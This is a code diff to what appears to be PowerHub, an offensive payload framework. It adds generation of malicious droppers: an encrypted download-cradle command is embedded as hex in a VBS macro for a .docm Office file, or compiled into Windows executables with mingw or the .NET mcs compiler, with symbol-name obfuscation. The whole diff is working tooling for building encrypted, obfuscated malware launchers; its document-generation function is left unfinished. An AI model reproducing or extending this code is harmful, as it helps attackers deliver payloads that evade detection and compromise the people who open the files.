@@ -7,6 +7,7 @@ import jinja2
 from powerhub.tools import encrypt, generate_random_key
 from powerhub.stager import build_cradle
 from powerhub.logging import log
+from powerhub.obfuscation import symbol_name
 
 
 def load_template(filename, **kwargs):
@@ -28,7 +29,15 @@ def create_filename(args):
     result += '-' + args['GroupTransport']
     if args['GroupClipExec'] != 'none':
         result += '-' + args['GroupClipExec']
-    result += '.exe'
+    if args['GroupLauncher'] in [
+        'mingw32-32bit',
+        'mingw32-64bit',
+        'dotnetexe-32bit',
+        'dotnetexe-64bit',
+    ]:
+        result += '.exe'
+    else:
+        result += '.docm'
     return result
 
 
@@ -45,11 +54,28 @@ def create_payload(args):
     return payload_generators[args['GroupLauncher']](args)
 
 
+def create_vbs(args):
+    filename = create_filename(args)
+    args = dict(args)  # convert from immutable dict
+    args['GroupLauncher'] = 'cmd_enc'
+    cmd = build_cradle(args)
+    key = generate_random_key(16)
+    cmd = encrypt(cmd.encode(), key)
+    vbs_code = load_template(
+        'powerhub.vbs',
+        HEX_CODE=' '.join('%02X' % c for c in cmd),
+        HEX_KEY=' '.join('%02X' % c for c in key),
+        symbol_name=symbol_name,
+    )
+    return filename, vbs_code
+
+
 def create_docx(args):
-    pass
+    _, vbs_code = create_vbs(args)
+    # randomize creator in docProps/core.xml
 
 
-def create_exe(args):
+def compile_source(args, source_file, compile_cmd, formatter):
     filename = create_filename(args)
     args = dict(args)  # convert from immutable dict
     args['GroupLauncher'] = 'cmd_enc'
@@ -58,25 +84,24 @@ def create_exe(args):
     key = generate_random_key(16)
     cmd = encrypt(cmd.encode(), key)
     c_code = load_template(
-        'powerhub.c',
-        CMD=''.join('\\x%02x' % c for c in cmd),
+        source_file,
+        CMD=formatter(cmd),
         LEN_CMD=size,
         KEY=key,
     )
 
-    if args['GroupLauncher'] == 'mingw32-32bit':
-        mingw = 'i686-w64-mingw32-gcc'
-    else:
-        mingw = 'x86_64-w64-mingw32-gcc'
-
     with tempfile.TemporaryDirectory() as tmpdirname:
-        outfile = os.path.join(tmpdirname, 'gcc.out')
+        outfile = os.path.join(tmpdirname, 'powerhub.out')
+        infile = os.path.join(tmpdirname, 'powerhub.in')
+        with open(infile, 'w') as f:
+            f.write(c_code)
         pipe = subprocess.Popen(
-            [mingw, "-Wall", "-x", "c", "-o", outfile, "-"],
+            compile_cmd(outfile) + [infile],
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
         )
-        out = pipe.communicate(c_code.encode())
+        out = pipe.communicate()
+        print(out)
         if pipe.returncode == 0:
             with open(outfile, 'rb') as f:
                 result = f.read()
@@ -89,5 +114,30 @@ def create_exe(args):
     return filename, result
 
 
+def create_exe(args):
+    if args['GroupLauncher'] == 'mingw32-32bit':
+        mingw = 'i686-w64-mingw32-gcc'
+    else:
+        mingw = 'x86_64-w64-mingw32-gcc'
+
+    return compile_source(
+        args,
+        'powerhub.c',
+        lambda outfile: [mingw, "-Wall", "-x", "c", "-o", outfile],
+        lambda cmd: ''.join('\\x%02x' % c for c in cmd),
+    )
+
+
 def create_dotnet(args):
-    pass
+    if args['GroupLauncher'] == 'dotnetexe-32bit':
+        platform = "x86"
+    else:
+        platform = "x64"
+
+    return compile_source(
+        args,
+        'powerhub.cs',
+        lambda outfile: ["mcs", "-warnaserror",
+                         "-platform:" + platform, "-out:" + outfile],
+        lambda cmd: ','.join('0x%02x' % c for c in cmd),
+    )
